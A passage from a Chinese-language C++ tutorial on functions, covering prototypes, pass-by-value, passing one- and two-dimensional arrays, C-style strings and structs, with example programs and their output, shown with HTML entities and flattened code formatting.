// 调用函数 print_greeting(); return 0;&#125; 示例：定义一个带参数并返回值的函数 这个函数接受两个整数作为参数，并返回它们的和。 12345678910111213141516#include &lt;iostream&gt;// 函数定义int add_numbers(int num1, int num2) &#123; int sum = num1 + num2; return sum; // 返回计算结果&#125;int main() &#123; int a = 5; int b = 3; // 调用函数并将返回值存储在 result 变量中 int result = add_numbers(a, b); std::cout &lt;&lt; &quot;The sum of &quot; &lt;&lt; a &lt;&lt; &quot; and &quot; &lt;&lt; b &lt;&lt; &quot; is: &quot; &lt;&lt; result &lt;&lt; std::endl; // 输出: The sum of 5 and 3 is: 8 return 0;&#125; 7.1.2 函数原型和函数调用函数原型 (Function Prototype) 也称为函数声明 (Function Declaration)，它告诉编译器函数的名称、返回类型以及参数列表（类型和顺序），但不包含函数体。原型通常放在 main() 函数之前或单独的头文件中。 为什么需要原型？ C++ 编译器在处理代码时需要“预先知道”函数的接口（它接受什么参数，返回什么类型），然后才能正确地处理对该函数的调用。如果函数定义出现在调用它的代码之后，编译器在遇到调用时就不知道该函数是否存在或如何调用它，从而导致编译错误。函数原型解决了这个问题。 语法: 1return_type function_name(parameter_type_list); // 注意末尾的分号 参数名称在原型中是可选的，但写上通常能提高可读性。 函数调用 (Function Call) 是指在程序中执行一个函数。通过使用函数名，并在括号中提供所需的实际参数（称为**实参 (Arguments)**）来完成调用。 语法: 1234567// 对于不返回值的函数function_name(argument_list);// 对于返回值的函数variable = function_name(argument_list);// 或者直接在表达式中使用// std::cout &lt;&lt; function_name(argument_list); 示例：使用函数原型 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 函数原型 (声明)void display_message(const char* msg); // 声明函数接口int multiply(int x, int y); // 声明函数接口int main() &#123; // 函数调用 display_message(&quot;This is a message.&quot;); int num1 = 6; int num2 = 7; int product = multiply(num1, num2); // 调用函数 std::cout &lt;&lt; &quot;The product of &quot; &lt;&lt; num1 &lt;&lt; &quot; and &quot; &lt;&lt; num2 &lt;&lt; &quot; is: &quot; &lt;&lt; product &lt;&lt; std::endl; // 输出: 42 return 0;&#125;// 函数定义 (实现) - 可以放在 main 之后，因为原型已经提供了信息void display_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl;&#125;// 函数定义 (实现)int multiply(int x, int y) &#123; return x * y;&#125; 总结: 函数定义: 提供了函数的完整实现（代码）。 函数原型: 声明了函数的接口（名称、返回类型、参数类型），让编译器知道如何调用它，通常放在调用之前。 函数调用: 通过函数名和实参来执行函数定义的代码。 函数是构建结构化和可维护 C++ 程序的核心工具。 7.2 函数参数和按值传递函数参数是函数与调用它的代码之间传递信息的桥梁。当调用函数时，我们提供的值（实参）会被传递给函数定义中声明的变量（形参）。C++ 默认的参数传递方式是**按值传递 (Pass by Value)**。 形参 (Parameters): 在函数定义或函数原型中声明的变量，它们是函数内部使用的局部变量，用于接收调用时传入的值。 实参 (Arguments): 在函数调用时传递给函数的具体值或变量。 按值传递 (Pass by Value): 当使用按值传递时，函数会创建每个形参的副本。调用函数时提供的实参的值会被复制到这些新的形参变量中。函数内部对形参所做的任何修改都只影响这个副本，不会影响到函数调用中使用的原始实参。 示例：演示按值传递 12345678910111213141516171819202122#include &lt;iostream&gt;// 函数定义：接受一个 int 参数 (形参 n)// 按值传递，n 是 value 的副本void modify_value(int n) &#123; std::cout &lt;&lt; &quot;Inside function (before modification): n = &quot; &lt;&lt; n &lt;&lt; std::endl; n = n * 2; // 修改形参 n 的值 std::cout &lt;&lt; &quot;Inside function (after modification): n = &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;int main() &#123; int value = 10; // 实参 std::cout &lt;&lt; &quot;Before calling function: value = &quot; &lt;&lt; value &lt;&lt; std::endl; // 调用函数，将 value 的值传递给形参 n modify_value(value); std::cout &lt;&lt; &quot;After calling function: value = &quot; &lt;&lt; value &lt;&lt; std::endl; // value 的值并未改变 return 0;&#125; 输出: 1234Before calling function: value &#x3D; 10Inside function (before modification): n &#x3D; 10Inside function (after modification): n &#x3D; 20After calling function: value &#x3D; 10 代码解释: main 函数中的变量 value 初始化为 10。 调用 modify_value(value) 时，value 的值 (10) 被复制给了 modify_value 函数的形参 n。 在 modify_value 函数内部，n 的值被修改为 20。但这仅仅修改了 n 这个局部副本。 当函数执行完毕返回 main 后，main 函数中的原始变量 value 仍然是 10，没有受到函数内部修改的影响。 优点: 安全性: 保护了原始数据不被函数意外修改。 缺点: 效率: 对于大型数据结构（如复杂的类对象或结构体），复制整个对象可能消耗较多的时间和内存。在这种情况下，后续章节将介绍的按引用传递或按指针传递可能更高效。 7.2.1 多个参数函数可以接受任意数量的参数。在函数定义和原型中，参数之间用逗号 , 分隔。调用函数时，提供的实参也必须用逗号分隔，并且数量、类型和顺序应与形参列表匹配。 示例：接受多个参数的函数 12345678910111213141516171819#include &lt;iostream&gt;// 函数原型：接受两个 double 和一个 charvoid display_data(double length, double width, char unit) &#123; std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; length &lt;&lt; &quot; &quot; &lt;&lt; unit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Width: &quot; &lt;&lt; width &lt;&lt; &quot; &quot; &lt;&lt; unit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; length * width &lt;&lt; &quot; sq &quot; &lt;&lt; unit &lt;&lt; std::endl;&#125;int main() &#123; double len = 5.5; double wid = 2.0; char symbol = &#x27;m&#x27;; // 调用函数，传递三个实参 display_data(len, wid, symbol); return 0;&#125; 输出: 123Length: 5.5 mWidth: 2 mArea: 11 sq m 7.2.2 另外一个接受两个参数的函数下面是另一个简单的例子，计算并返回两个整数中的较大值。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 函数定义：接受两个 int 参数，返回较大的那个 intint max(int a, int b) &#123; if (a &gt; b) &#123; return a; &#125; else &#123; return b; &#125; // 或者使用三元运算符: return (a &gt; b) ? a : b;&#125;int main() &#123; int num1 = 15; int num2 = 28; // 调用函数，传递两个实参 int larger_value = max(num1, num2); std::cout &lt;&lt; &quot;Between &quot; &lt;&lt; num1 &lt;&lt; &quot; and &quot; &lt;&lt; num2 &lt;&lt; &quot;, the larger value is: &quot; &lt;&lt; larger_value &lt;&lt; std::endl; // 输出: 28 // 也可以直接在输出语句中调用 std::cout &lt;&lt; &quot;The max of 100 and 99 is: &quot; &lt;&lt; max(100, 99) &lt;&lt; std::endl; // 输出: 100 return 0;&#125; 这个例子再次展示了如何定义和调用带有多个参数的函数，并且该函数还返回一个值。参数 a 和 b 也是按值传递的。 7.3 函数和数组将数组传递给函数是 C++ 中常见的操作，但其工作方式与传递普通变量（如 int 或 double）有显著不同。理解这种差异对于正确使用数组作为函数参数至关重要。 与基本类型默认使用“按值传递”（创建副本）不同，当将数组传递给函数时，C++ 不会复制整个数组。相反，它传递的是数组第一个元素的内存地址。这意味着函数实际上接收的是一个指向数组起始位置的指针。 7.3.1 函数如何使用指针来处理数组因为函数接收的是数组的地址（指针），所以它可以通过这个地址直接访问和修改原始数组的内容。这与按值传递完全不同，后者操作的是副本。 在函数定义中，接收数组参数有几种等效的语法： 12345678// 语法 1: 使用指针表示法void process_array(int* arr, int size);// 语法 2: 使用带空括号的数组表示法void process_array(int arr[], int size);// 语法 3: 使用带指定大小的数组表示法 (大小会被忽略，不推荐)// void process_array(int arr[10], int size); // 这里的 10 实际上没有作用 这三种语法在函数参数列表中是等效的，它们都告诉编译器 arr 是一个指向 int 的指针。最常用的是语法 1 和语法 2。 关键点: 无论使用哪种语法，函数都不知道数组的实际大小。因此，通常需要将数组的大小作为单独的参数传递给函数。 示例：函数修改数组元素 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;// 函数原型：接收一个 int 指针 (数组) 和大小void double_elements(int arr[], int size) &#123; // 或者 int* arr std::cout &lt;&lt; &quot;Inside function: Modifying array elements...&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; size; ++i) &#123; arr[i] *= 2; // 直接修改原始数组的元素 &#125;&#125;int main() &#123; int my_array[] = &#123;1, 2, 3, 4, 5&#125;; int array_size = sizeof(my_array) / sizeof(my_array[0]); // 计算数组大小 std::cout &lt;&lt; &quot;Before calling function: &quot;; for (int i = 0; i &lt; array_size; ++i) &#123; std::cout &lt;&lt; my_array[i] &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 调用函数，传递数组名 (即地址) 和大小 double_elements(my_array, array_size); std::cout &lt;&lt; &quot;After calling function: &quot;; for (int i = 0; i &lt; array_size; ++i) &#123; std::cout &lt;&lt; my_array[i] &lt;&lt; &quot; &quot;; // 数组内容已被修改 &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 输出: 123Before calling function: 1 2 3 4 5Inside function: Modifying array elements...After calling function: 2 4 6 8 10 代码解释: main 函数定义了一个数组 my_array。 调用 double_elements(my_array, array_size) 时，my_array (代表数组首元素的地址) 被传递给函数的 arr 参数，array_size 被传递给 size 参数。 函数内部通过指针 arr 访问并修改了 main 函数中定义的 my_array 的元素。 函数返回后，main 函数中的 my_array 的内容确实发生了改变。 7.3.2 将数组作为参数意味着什么将数组名传递给函数时，会发生所谓的“数组退化”（Array Decay）。数组名会“退化”成指向其第一个元素的指针。这就是为什么函数参数 int arr[] 和 int* arr 是等价的。 Implications: 效率: 不需要复制整个数组，传递地址非常快，尤其是对于大数组。 修改能力: 函数可以直接修改调用者提供的原始数组。这既是优点（允许函数“返回”修改后的数组）也是缺点（可能意外修改数据）。 丢失大小信息: 函数本身无法知道数组的大小。必须显式传递大小信息。 7.3.3 更多数组函数示例示例 1: 计算数组元素总和 123456789101112131415161718#include &lt;iostream&gt;// 函数：计算数组元素的总和int sum_array(const int arr[], int size) &#123; // 使用 const 防止意外修改 int total = 0; for (int i = 0; i &lt; size; ++i) &#123; total += arr[i]; &#125; return total;&#125;int main() &#123; int data[] = &#123;10, 20, 30, 40&#125;; int size = sizeof(data) / sizeof(data[0]); int sum = sum_array(data, size); std::cout &lt;&lt; &quot;Sum of array elements: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出: 100 return 0;&#125; 示例 2: 查找数组中的最大值 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;limits&gt; // 为了使用 INT_MIN// 函数：查找数组中的最大值int find_max(const int* arr, int size) &#123; // 使用指针表示法和 const if (size &lt;= 0) &#123; std::cerr &lt;&lt; &quot;Error: Array size must be positive.&quot; &lt;&lt; std::endl; return std::numeric_limits&lt;int&gt;::min(); // 返回可能的最小值作为错误指示 &#125; int max_val = arr[0]; for (int i = 1; i &lt; size; ++i) &#123; if (arr[i] &gt; max_val) &#123; max_val = arr[i]; &#125; &#125; return max_val;&#125;int main() &#123; int scores[] = &#123;88, 95, 72, 100, 91&#125;; int count = sizeof(scores) / sizeof(scores[0]); int highest_score = find_max(scores, count); std::cout &lt;&lt; &quot;Highest score: &quot; &lt;&lt; highest_score &lt;&lt; std::endl; // 输出: 100 return 0;&#125; 7.3.4 使用数组区间的函数除了传递数组首地址和大小之外，另一种常见且更灵活的方法是传递指向数组开始和结束之后位置的指针（或迭代器，STL 中常用）。这定义了一个处理范围 [begin, end)（包含 begin，不包含 end）。 示例：使用指针区间求和 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 函数：计算从 begin 到 end (不含 end) 的元素和int sum_range(const int* begin, const int* end) &#123; int total = 0; // 循环直到当前指针达到 end 指针 for (const int* ptr = begin; ptr != end; ++ptr) &#123; total += *ptr; // 解引用指针获取元素值 &#125; return total;&#125;int main() &#123; int data[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int size = sizeof(data) / sizeof(data[0]); // 计算整个数组的和 int total_sum = sum_range(data, data + size); // data + size 指向数组末尾之后的位置 std::cout &lt;&lt; &quot;Total sum: &quot; &lt;&lt; total_sum &lt;&lt; std::endl; // 输出: 55 // 计算数组一部分的和 (例如，索引 2 到 6，即元素 3, 4, 5, 6, 7) int partial_sum = sum_range(data + 2, data + 7); // data+2 指向第3个元素, data+7 指向第8个元素 (区间终点) std::cout &lt;&lt; &quot;Partial sum (index 2 to 6): &quot; &lt;&lt; partial_sum &lt;&lt; std::endl; // 输出: 25 return 0;&#125; 这种方法在 C++ 标准库算法中非常常用。 7.3.5 指针和 const如前面的示例所示，如果函数不应该修改传入的数组，应该在函数参数中使用 const 关键字。这是一种重要的编程实践，可以提高代码的安全性和清晰度。 123456789// 这个函数承诺不会修改 arr 指向的数组内容void print_array(const int arr[], int size) &#123; std::cout &lt;&lt; &quot;Array elements: &quot;; for (int i = 0; i &lt; size; ++i) &#123; // arr[i] = 0; // 错误！编译器会阻止修改 const 数据 std::cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl;&#125; 使用 const 有两个主要好处： 防止意外修改: 编译器会检查并阻止函数内部对 const 参数的修改尝试。 表明意图: 向函数的调用者表明该函数不会改变传入的数组，使得函数接口更清晰。 接受更广泛的参数: const 参数的函数可以接受 const 数组和非 const 数组作为实参，而非 const 参数的函数只能接受非 const 数组。 总结来说，将数组传递给函数是通过传递指向其首元素的指针来实现的。这使得函数能够访问和（如果未使用 const）修改原始数组，但也要求调用者通常需要额外传递数组的大小或使用指针区间来界定操作范围。 7.4 函数和二维数组将二维数组传递给函数比传递一维数组稍微复杂一些。与一维数组类似，二维数组名在传递时也会“退化”成指向其第一个元素的指针。但二维数组的第一个元素本身是一个一维数组。因此，传递的是指向一维数组的指针。 为了让函数能够正确地计算元素在内存中的位置，编译器需要知道除第一维（行数）之外的所有其他维度的大小（列数，以及更高维度的相应大小）。 关键点: 在函数参数中声明二维数组时，必须指定除第一维之外的所有维度的大小。第一维的大小是可选的（通常省略）。 语法: 假设有一个二维数组 int data[3][4]; 函数原型或定义可以这样写： 123456789// 语法 1: 指定列数void process_2d_array(int arr[][4], int rows); // 必须指定列数 4// 语法 2: 使用指向数组的指针 (更精确地反映底层机制)// arr 是一个指针，指向一个包含 4 个 int 的数组void process_2d_array(int (*arr)[4], int rows);// 语法 3: 可以包含第一维，但通常省略// void process_2d_array(int arr[3][4], int rows); // 这里的 3 实际上会被忽略 为什么必须指定列数？ 考虑二维数组 arr[rows][cols] 在内存中是线性存储的。要访问元素 arr[i][j]，编译器需要计算其内存地址，公式通常类似于：基地址 + (i * cols + j) * sizeof(元素类型)。可以看到，计算地址需要知道 cols（列数）的值。如果函数不知道列数，就无法正确地进行指针运算来定位元素。 示例：处理二维数组的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;const int COLS = 4; // 使用常量定义列数，方便维护// 函数原型：计算二维数组所有元素的和// 参数：二维数组 (必须指定列数 COLS)，行数int sum_2d_array(int arr[][COLS], int rows);// 函数原型：打印二维数组void print_2d_array(const int arr[][COLS], int rows); // 使用 const 防止修改int main() &#123; int data[3][COLS] = &#123; &#123;1, 2, 3, 4&#125;, &#123;5, 6, 7, 8&#125;, &#123;9, 10, 11, 12&#125; &#125;; int num_rows = 3; std::cout &lt;&lt; &quot;Original 2D Array:&quot; &lt;&lt; std::endl; print_2d_array(data, num_rows); int total_sum = sum_2d_array(data, num_rows); std::cout &lt;&lt; &quot;\\nSum of all elements: &quot; &lt;&lt; total_sum &lt;&lt; std::endl; // 输出: 78 return 0;&#125;// 函数定义：计算二维数组所有元素的和int sum_2d_array(int arr[][COLS], int rows) &#123; int sum = 0; for (int i = 0; i &lt; rows; ++i) &#123; for (int j = 0; j &lt; COLS; ++j) &#123; sum += arr[i][j]; &#125; &#125; return sum;&#125;// 函数定义：打印二维数组void print_2d_array(const int arr[][COLS], int rows) &#123; for (int i = 0; i &lt; rows; ++i) &#123; for (int j = 0; j &lt; COLS; ++j) &#123; std::cout &lt;&lt; arr[i][j] &lt;&lt; &quot;\\t&quot;; // 使用制表符分隔 &#125; std::cout &lt;&lt; std::endl; // 每行结束后换行 &#125;&#125; 代码解释: 我们定义了一个全局常量 COLS 来表示数组的列数。这使得在函数原型和定义中指定列数更加方便和一致。 sum_2d_array 和 print_2d_array 函数的第一个参数都声明为 int arr[][COLS] 或 const int arr[][COLS]，明确指定了列的大小。 main 函数中定义了一个 3x4 的二维数组 data。 调用函数时，传递数组名 data（它代表指向第一个包含 COLS 个 int 的一维数组的指针）和行数 num_rows。 函数内部可以使用标准的 arr[i][j] 语法来访问数组元素，因为编译器知道列数 COLS，可以正确计算每个元素的地址。 总结: 将二维（或更高维）数组传递给函数时，必须在函数参数中指定除第一维之外的所有维度的大小。 这是因为函数需要这些维度信息来进行正确的指针运算以访问数组元素。 通常将数组维度（尤其是除第一维外的维度）定义为常量，以提高代码的可读性和可维护性。 与一维数组一样，函数操作的是原始数组，而不是副本（除非使用了 const，否则函数可以修改原始数组）。 7.5 函数和 C-风格字符串C-风格字符串本质上是字符数组 (char[])，其末尾有一个特殊的空字符 (\\0) 来标记字符串的结束。因此，将 C-风格字符串传递给函数遵循与传递普通数组相同的规则：传递的是指向字符串第一个字符的指针 (char*)。 函数不需要单独的参数来指定字符串的长度，因为它可以遍历字符序列直到遇到空字符 \\0 来确定字符串的结束。 7.5.1 将 C-风格字符串作为参数的函数当函数接收 C-风格字符串作为参数时，通常使用 char* 或 const char* 类型。如果函数不打算修改字符串内容，强烈建议使用 const char*，这可以防止意外修改，并允许函数接受字符串字面值（它们是常量）和 const 字符数组作为参数。 示例 1: 计算 C-风格字符串的长度 123456789101112131415161718192021222324#include &lt;iostream&gt;// 函数原型：计算 C 风格字符串的长度// 使用 const char* 因为我们不修改字符串unsigned int string_length(const char* str) &#123; unsigned int length = 0; // 循环直到遇到空字符 &#x27;\\0&#x27; while (*str != &#x27;\\0&#x27;) &#123; length++; str++; // 移动指针到下一个字符 &#125; return length;&#125;int main() &#123; char greeting[] = &quot;Hello&quot;; const char* message = &quot;World!&quot;; std::cout &lt;&lt; &quot;Length of \\&quot;&quot; &lt;&lt; greeting &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; string_length(greeting) &lt;&lt; std::endl; // 输出: 5 std::cout &lt;&lt; &quot;Length of \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; string_length(message) &lt;&lt; std::endl; // 输出: 6 std::cout &lt;&lt; &quot;Length of \\&quot;C++\\&quot;: &quot; &lt;&lt; string_length(&quot;C++&quot;) &lt;&lt; std::endl; // 输出: 3 return 0;&#125; 示例 2: 打印 C-风格字符串 123456789101112131415161718192021#include &lt;iostream&gt;// 函数：打印 C 风格字符串void print_string(const char* str) &#123; // 可以直接使用 cout，它知道如何处理 char* 直到遇到 &#x27;\\0&#x27; std::cout &lt;&lt; str; // 或者手动遍历 // while (*str != &#x27;\\0&#x27;) &#123; // std::cout &lt;&lt; *str; // str++; // &#125;&#125;int main() &#123; char name[] = &quot;Alice&quot;; std::cout &lt;&lt; &quot;Name: &quot;; print_string(name); std::cout &lt;&lt; std::endl; return 0;&#125; 重要注意事项: 空字符终止: 处理 C-风格字符串的函数依赖于空字符 \\0 来确定结束。如果传递的字符数组没有正确地以 \\0 结尾，函数可能会读取超出数组边界的内存，导致未定义行为（通常是程序崩溃或数据损坏）。 缓冲区溢出: 如果函数需要修改传入的字符串或将数据写入字符数组缓冲区（例如 strcpy, strcat 的自定义版本），必须确保操作不会超出缓冲区的分配大小，否则会发生缓冲区溢出，这是一个严重的安全漏洞。通常需要传递缓冲区的大小作为额外参数。 const 正确性: 明确使用 const char* 来表示函数不会修改输入字符串。 7.5.2 返回 C-风格字符串的函数让函数返回一个 C-风格字符串（即 char*）比传递它要复杂得多，并且充满了潜在的陷阱。主要问题在于字符串数据存储在哪里以及其生命周期。 常见的错误方式 (危险！): 返回指向局部变量的指针: 123456// !!! 错误且危险的示例 !!!char* create_temp_string() &#123; char temp[] = &quot;Temporary&quot;; return temp; // 错误！temp 是局部数组，函数返回后内存被释放 // 返回的指针将指向无效内存 (悬挂指针)&#125; 调用 create_temp_string() 后得到的指针是无效的，解引用它会导致未定义行为。 可行的（但各有缺点）方式: 返回指向静态局部变量的指针: 12345678910111213141516171819202122#include &lt;iostream&gt;// 使用静态局部变量const char* get_static_message() &#123; static char message[] = &quot;Static Message&quot;; // message 在程序整个生命周期内存在，但只有一个实例 return message;&#125;int main() &#123; const char* msg1 = get_static_message(); std::cout &lt;&lt; &quot;Msg1: &quot; &lt;&lt; msg1 &lt;&lt; std::endl; // 输出: Static Message // 如果函数被再次调用，它会返回指向 *同一个* 静态内存的指针 // 如果函数内部修改了静态变量，所有之前的指针都会看到变化 // 这种方式不是线程安全的 const char* msg2 = get_static_message(); std::cout &lt;&lt; &quot;Msg2: &quot; &lt;&lt; msg2 &lt;&lt; std::endl; // 输出: Static Message // msg1 和 msg2 指向同一块内存 return 0;&#125; 缺点: 返回的指针指向的内存在后续调用中可能被覆盖（如果函数修改静态变量的话），并且这种方法不是线程安全的。 返回指向动态分配内存的指针 (new): 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strcpy// 返回动态分配的内存char* create_dynamic_string(const char* initial_value) &#123; char* dynamic_str = new char[strlen(initial_value) + 1]; // 分配内存 (+1 for &#x27;\\0&#x27;) strcpy(dynamic_str, initial_value); // 复制内容 return dynamic_str; // 返回指向新分配内存的指针&#125;int main() &#123; char* str1 = create_dynamic_string(&quot;Dynamic Data&quot;); std::cout &lt;&lt; &quot;Dynamic String 1: &quot; &lt;&lt; str1 &lt;&lt; std::endl; // !!! 重要：调用者必须负责释放内存 !!! delete[] str1; str1 = nullptr; // 好习惯：释放后置空指针 char* str2 = create_dynamic_string(&quot;More Data&quot;); std::cout &lt;&lt; &quot;Dynamic String 2: &quot; &lt;&lt; str2 &lt;&lt; std::endl; delete[] str2; str2 = nullptr; return 0;&#125; 缺点: 调用者必须记住使用 delete[] 来释放返回的指针所指向的内存，否则会导致内存泄漏。这种责任转移很容易出错。 传递由调用者分配的缓冲区 (推荐方式): 这是最安全、最常用的方法。函数接受一个指向调用者提供的缓冲区的指针和该缓冲区的大小，然后将结果字符串写入该缓冲区。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strncpy// 函数将结果写入调用者提供的缓冲区// 返回值可以指示成功/失败或写入的字符数bool format_greeting(char buffer[], size_t buffer_size, const char* name) &#123; // 使用 snprintf 或其他安全函数来防止缓冲区溢出 int written = snprintf(buffer, buffer_size, &quot;Hello, %s!&quot;, name); // 检查是否成功且未截断 (snprintf 返回值特性) if (written &gt; 0 &amp;&amp; written &lt; buffer_size) &#123; return true; // 成功 &#125; else &#123; // 可能缓冲区太小或发生错误 if (buffer_size &gt; 0) buffer[0] = &#x27;\\0&#x27;; // 确保缓冲区为空字符串 return false; // 失败 &#125;&#125;int main() &#123; const size_t BUF_SIZE = 50; char my_buffer[BUF_SIZE]; if (format_greeting(my_buffer, BUF_SIZE, &quot;Alice&quot;)) &#123; std::cout &lt;&lt; &quot;Formatted Greeting: &quot; &lt;&lt; my_buffer &lt;&lt; std::endl; // 输出: Hello, Alice! &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to format greeting (buffer too small?)&quot; &lt;&lt; std::endl; &#125; if (format_greeting(my_buffer, 10, &quot;Bob The Builder&quot;)) &#123; // 尝试用小缓冲区 std::cout &lt;&lt; &quot;Formatted Greeting: &quot; &lt;&lt; my_buffer &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to format greeting (buffer too small?)&quot; &lt;&lt; std::endl; // 这将被打印 std::cout &lt;&lt; &quot;Buffer content after fail: \\&quot;&quot; &lt;&lt; my_buffer &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出: &quot;&quot; (因为函数清空了) &#125; return 0;&#125; 优点: 内存管理由调用者负责，函数本身不分配内存，避免了内存泄漏和悬挂指针的风险。函数接口清晰地表明了其对缓冲区的需求。 总结: 将 C-风格字符串作为参数传递给函数时，传递的是 char*，函数依赖 \\0 确定结束，使用 const char* 防止意外修改。 让函数返回 C-风格字符串 (char*) 比较棘手。返回指向局部变量的指针是错误的。返回静态变量指针有局限性。返回动态分配内存 (new) 要求调用者管理内存 (delete[])。 最安全、最推荐的方式是让调用者提供缓冲区，函数将结果写入该缓冲区，并通常传递缓冲区大小以防止溢出。 在现代 C++ 中，通常更推荐使用 std::string 类来处理字符串，因为它会自动管理内存，避免了许多与 C-风格字符串相关的陷阱。 7.6 函数和结构结构 (struct) 是一种用户定义的复合类型，可以将不同类型的数据项组合成一个单一的实体。与基本数据类型一样，结构也可以作为参数传递给函数，并且函数也可以返回结构类型的值。 7.6.1 传递和返回结构默认情况下，结构与基本数据类型（如 int, double）一样，是按值传递 (Pass by Value) 给函数的。这意味着当将一个结构变量作为实参传递给函数时，函数会创建该结构的一个完整副本（形参），并在函数内部操作这个副本。对副本成员的任何修改都不会影响原始结构变量。 同样，函数也可以声明一个结构类型作为其返回类型。当函数返回一个结构时，它会创建一个该结构的临时副本，并将其返回给调用者。 示例：按值传递和返回结构 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt; // 使用 string 类成员// 定义一个简单的结构struct Point &#123; double x; double y;&#125;;// 函数原型：按值接收 Point 结构，并打印其坐标void display_point(Point p) &#123; // p 是 pt_main 的副本 std::cout &lt;&lt; &quot;Displaying Point (inside function): (&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // 修改副本的值，不会影响原始结构 p.x = 100.0; std::cout &lt;&lt; &quot;Modified copy inside function: (&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;&#125;// 函数原型：创建一个新的 Point 结构并按值返回Point create_point(double x_val, double y_val) &#123; Point new_p; new_p.x = x_val; new_p.y = y_val; std::cout &lt;&lt; &quot;Creating Point (&quot; &lt;&lt; new_p.x &lt;&lt; &quot;, &quot; &lt;&lt; new_p.y &lt;&lt; &quot;) inside create_point.&quot; &lt;&lt; std::endl; return new_p; // 返回 Point 结构的副本&#125;int main() &#123; Point pt_main = &#123;3.0, 4.0&#125;; std::cout &lt;&lt; &quot;Before calling display_point: (&quot; &lt;&lt; pt_main.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_main.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // 按值传递 pt_main display_point(pt_main); std::cout &lt;&lt; &quot;After calling display_point: (&quot; &lt;&lt; pt_main.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_main.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // 原始结构未改变 std::cout &lt;&lt; &quot;\\nCalling create_point...&quot; &lt;&lt; std::endl; // 接收函数返回的 Point 结构副本 Point pt_returned = create_point(5.5, -1.2); std::cout &lt;&lt; &quot;Returned Point in main: (&quot; &lt;&lt; pt_returned.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_returned.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; return 0;&#125; 输出: 12345678Before calling display_point: (3, 4)Displaying Point (inside function): (3, 4)Modified copy inside function: (100, 4)After calling display_point: (3, 4)Calling create_point...Creating Point (5.5, -1.2) inside create_point.Returned Point in main: (5.5, -1.2) 按值传递的优缺点: 优点: 保护原始数据不被函数修改，概念简单。 缺点: 对于包含大量数据成员的结构，复制整个结构可能效率低下，消耗时间和内存。 7.6.2 另一个处理结构的函数示例假设我们需要一个函数来计算两个点之间的中点。 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;struct Point &#123; double x; double y;&#125;;// 函数：计算两个 Point 的中点，并返回一个新的 PointPoint find_midpoint(Point p1, Point p2) &#123; Point midpoint; midpoint.x = (p1.x + p2.x) / 2.0; midpoint.y = (p1.y + p2.y) / 2.0; return midpoint;&#125;// 辅助函数：打印 Point (按值传递)void print_point(Point p) &#123; std::cout &lt;&lt; &quot;(&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot;;&#125;int main() &#123; Point start_point = &#123;1.0, 1.0&#125;; Point end_point = &#123;5.0, 7.0&#125;; std::cout &lt;&lt; &quot;Start point: &quot;; print_point(start_point); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;End point: &quot;; print_point(end_point); std::cout &lt;&lt; std::endl; // 调用函数计算中点 Point mid = find_midpoint(start_point, end_point); std::cout &lt;&lt; &quot;Midpoint: &quot;; print_point(mid); // 输出: (3, 4) std::cout &lt;&lt; std::endl; return 0;&#125; 这个例子再次展示了按值传递结构（p1, p2 是副本）和按值返回结构（midpoint 的副本被返回）。 7.6.3 传递结构的地址为了避免复制整个结构的开销，特别是当结构很大时，或者当需要函数能够修改原始结构时，可以传递结构的地址（即指向结构的指针）而不是结构本身。 方法: 函数参数: 声明为指向结构类型的指针 (struct_type*)。 函数调用: 使用地址运算符 &amp; 获取结构变量的地址传递给函数。 访问成员: 在函数内部，需要使用间接成员访问运算符 -&gt; (箭头运算符) 来访问指针指向的结构的成员。或者，先解引用指针 *ptr，然后再使用点运算符 .，即 (*ptr).member。ptr-&gt;member 是 (*ptr).member 的简洁写法。 示例：按指针传递结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;struct Rectangle &#123; double width; double height;&#125;;// 函数原型：接收指向 Rectangle 的指针，计算面积// 使用 const 表示函数不会通过指针修改结构内容double calculate_area(const Rectangle* rect_ptr) &#123; // 检查空指针是一种好的防御性编程习惯 if (rect_ptr == nullptr) &#123; std::cerr &lt;&lt; &quot;Error: Null pointer passed to calculate_area.&quot; &lt;&lt; 